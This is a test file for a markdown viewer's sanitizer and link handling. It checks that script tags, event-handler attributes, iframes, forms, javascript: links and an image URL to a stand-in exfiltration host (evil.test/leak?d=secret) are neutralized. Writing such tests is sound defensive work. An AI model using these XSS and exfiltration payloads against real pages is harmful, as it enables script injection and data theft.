// @vitest-environment jsdom
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { MarkdownViewer } from "./MarkdownViewer.tsx";
import { targetOf } from "./links.ts";
import { ID_PREFIX, renderDocument, sanitize } from "./viewer-engine.ts";

afterEach(cleanup);

function dom(html: string): HTMLElement {
  const root = document.createElement("div");
  root.innerHTML = html;
  return root;
}

describe("viewer engine (docs/SECURITY.md T10)", () => {
  it("renders GFM, highlighting, and folded front matter", () => {
    const { html, headings } = renderDocument(
      [
        "---",
        "title: Plan",
        "---",
        "# Plan",
        "",
        "## Steps",
        "",
        "- [x] done",
        "- [ ] next",
        "",
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
        "",
        "> [!NOTE]",
        "> Read this.",
        "",
        "```ts",
        "const x = 1;",
        "```",
        "",
        'He said "no" -- twice.',
      ].join("\n"),
    );
    const root = dom(html);
    expect(root.querySelector("details.front-matter")?.hasAttribute("open")).toBe(false);
    expect(root.querySelector("details.front-matter")?.textContent).toContain("Plan");
    expect(root.querySelectorAll(".task-list-item-checkbox")).toHaveLength(2);
    expect(root.querySelector(":scope > table td")?.textContent).toBe("1");
    expect(root.querySelector(".markdown-alert-note")).not.toBeNull();
    expect(root.querySelector("pre code .hljs-keyword")?.textContent).toBe("const");
    // Quotes and dashes stay as the agent wrote them.
    expect(root.textContent).toContain('He said "no" -- twice.');
    expect(headings.map((h) => [h.level, h.text, h.id])).toEqual([
      [1, "Plan", "plan"],
      [2, "Steps", "steps"],
    ]);
  });

  it("prefixes ids so a document cannot reuse the app's", () => {
    const root = dom(renderDocument("# root").html);
    expect(root.querySelector("h1")?.id).toBe(`${ID_PREFIX}root`);
  });

  it.each([
    "<script>window.pwned = 1</script>",
    '<img src=x onerror="window.pwned=1">',
    '<iframe src="https://evil.test"></iframe>',
    '<div onclick="alert(1)">click</div>',
    "<style>body{display:none}</style>",
  ])("shows raw HTML as text: %s", (source) => {
    const root = dom(renderDocument(source).html);
    expect(root.querySelector("script, img, iframe, style, [onclick], [onerror]")).toBeNull();
    expect(root.textContent).toContain(source);
  });

  it("shows images as links, as in chat, and never loads them", () => {
    const root = dom(
      renderDocument("![chart](https://evil.test/leak?d=secret) ![](diagram.png) ![x](ftp://a/b)")
        .html,
    );
    expect(root.querySelector("img")).toBeNull();
    const [remote, local] = Array.from(root.querySelectorAll<HTMLElement>("a.image-ref"));
    expect(remote?.textContent).toBe("[image: chart]");
    expect(remote?.dataset).toMatchObject({
      link: "external",
      target: "https://evil.test/leak?d=secret",
    });
    expect(local?.textContent).toBe("[image: untitled]");
    expect(local?.dataset).toMatchObject({ link: "document-file", target: "diagram.png" });
    // Another scheme is neither: text only.
    expect(root.querySelector("span.image-ref")?.textContent).toBe("[image: x]");
  });

  it("points every link at #, with where it leads in data- attributes", () => {
    const root = dom(
      renderDocument(
        [
          "[site](https://example.com/a) <https://example.com/b> https://example.com/c",
          "[mail](mailto:a@example.com) [up](#plan) [doc](../README.md) [code](src/a.ts#L3)",
          "See src/app.ts:42 and `lib/util.js`.",
          "[bad](javascript:alert(1)) [ftp](ftp://example.com/)",
        ].join("\n\n"),
      ).html,
    );
    const links = Array.from(root.querySelectorAll<HTMLAnchorElement>("a"));
    expect(links.every((a) => a.getAttribute("href") === "#")).toBe(true);
    expect(
      links.map((a) => [a.textContent, a.dataset.link, a.dataset.target, a.dataset.line]),
    ).toEqual([
      ["site", "external", "https://example.com/a", undefined],
      ["https://example.com/b", "external", "https://example.com/b", undefined],
      ["https://example.com/c", "external", "https://example.com/c", undefined],
      ["mail", "external", "mailto:a@example.com", undefined],
      ["up", "anchor", "plan", undefined],
      ["doc", "document-file", "../README.md", undefined],
      ["code", "document-file", "src/a.ts", "3"],
      ["src/app.ts:42", "workspace-file", "src/app.ts", "42"],
      ["lib/util.js", "workspace-file", "lib/util.js", undefined],
      ["ftp", "none", undefined, undefined],
    ]);
    expect(root.querySelector("a.file-ref")?.textContent).toBe("src/app.ts:42");
    // markdown-it refuses javascript: (and data:) links while parsing: they stay text.
    expect(root.textContent).toContain("[bad](javascript:alert(1))");
    expect(links[0]?.title).toBe("https://example.com/a");
  });

  it("links footnotes within the document", () => {
    const root = dom(renderDocument("Text.[^1]\n\n[^1]: The note.").html);
    const ref = root.querySelector<HTMLAnchorElement>("sup.footnote-ref a")!;
    const target = targetOf(ref);
    expect(target).toEqual({ kind: "anchor", id: "fn1" });
    expect(root.querySelector(`#${CSS.escape(ID_PREFIX + "fn1")}`)).not.toBeNull();
  });

  it("cleans what plugins produce, not only the source", () => {
    const root = dom(
      sanitize(
        '<p style="color:red" onmouseover="x()">a</p><svg><script>x()</script></svg>' +
          '<img src="https://evil.test"><form action="https://evil.test"><button>b</button></form>' +
          '<a href="https://ok.test" data-file-path="src/a.ts">ok</a>',
      ),
    );
    expect(root.querySelector("[style], [onmouseover], svg, script, img, form, button")).toBeNull();
    expect(root.querySelector("a")?.getAttribute("href")).toBe("https://ok.test");
    expect(root.querySelector("a")?.dataset.filePath).toBe("src/a.ts");
  });
});

describe("MarkdownViewer", () => {
  const doc = "# Plan\n\nIntro.\n\n## Steps\n\nDo it.\n";

  it("renders, then shows the source under Raw", async () => {
    const { container } = render(<MarkdownViewer text={doc} title="/ws/docs/plan.md" />);
    expect(await screen.findByRole("heading", { name: "Steps" })).toBeTruthy();
    expect(screen.getByText("plan.md").getAttribute("title")).toBe("/ws/docs/plan.md");

    fireEvent.click(screen.getByRole("tab", { name: "Raw" }));
    expect(screen.getByRole("tab", { name: "Raw" }).getAttribute("aria-selected")).toBe("true");
    expect(container.querySelector("h2")).toBeNull();
    expect(container.querySelector("pre code")?.textContent).toBe(doc);

    fireEvent.click(screen.getByRole("tab", { name: "Rendered" }));
    expect(container.querySelector("h2")?.textContent).toBe("Steps");
  });

  it("lists the headings and scrolls to one", async () => {
    const scroll = vi.fn();
    Element.prototype.scrollIntoView = scroll;
    render(<MarkdownViewer text={doc} />);
    const contents = await screen.findByRole("navigation", { name: "Contents" });
    const steps = Array.from(contents.querySelectorAll("button")).find(
      (b) => b.textContent === "Steps",
    )!;
    act(() => steps.click());
    expect(scroll).toHaveBeenCalledTimes(1);
    expect((scroll.mock.contexts[0] as Element).id).toBe(`${ID_PREFIX}steps`);
  });

  it("shows no contents list for a single heading", async () => {
    render(<MarkdownViewer text={"# Only\n\ntext"} />);
    await screen.findByRole("heading", { name: "Only" });
    expect(screen.queryByRole("navigation", { name: "Contents" })).toBeNull();
  });

  it("follows links through onLink, scrolls anchors itself, and shows a refusal", async () => {
    const scroll = vi.fn();
    Element.prototype.scrollIntoView = scroll;
    const onLink = vi
      .fn()
      .mockResolvedValueOnce(undefined)
      .mockRejectedValueOnce("x.md is outside this thread's workspace");
    render(
      <MarkdownViewer
        text={"# Plan\n\n[site](https://example.com/) [top](#plan) [x](../../x.md) [bad](ftp://a/)"}
        onLink={onLink}
      />,
    );
    const site = await screen.findByText("site");
    const click = (element: Element) => {
      const event = new MouseEvent("click", { bubbles: true, cancelable: true });
      act(() => void element.dispatchEvent(event));
      return event;
    };
    // The webview itself never follows a link.
    expect(click(site).defaultPrevented).toBe(true);
    expect(onLink).toHaveBeenLastCalledWith({ kind: "external", url: "https://example.com/" });

    click(screen.getByText("top"));
    expect((scroll.mock.contexts[0] as Element).id).toBe(`${ID_PREFIX}plan`);
    expect(onLink).toHaveBeenCalledTimes(1);

    click(screen.getByText("bad"));
    expect(onLink).toHaveBeenCalledTimes(1);

    click(screen.getByText("x"));
    expect(onLink).toHaveBeenLastCalledWith({ kind: "file", path: "../../x.md", from: "document" });
    expect((await screen.findByRole("alert")).textContent).toContain("outside");
  });
});
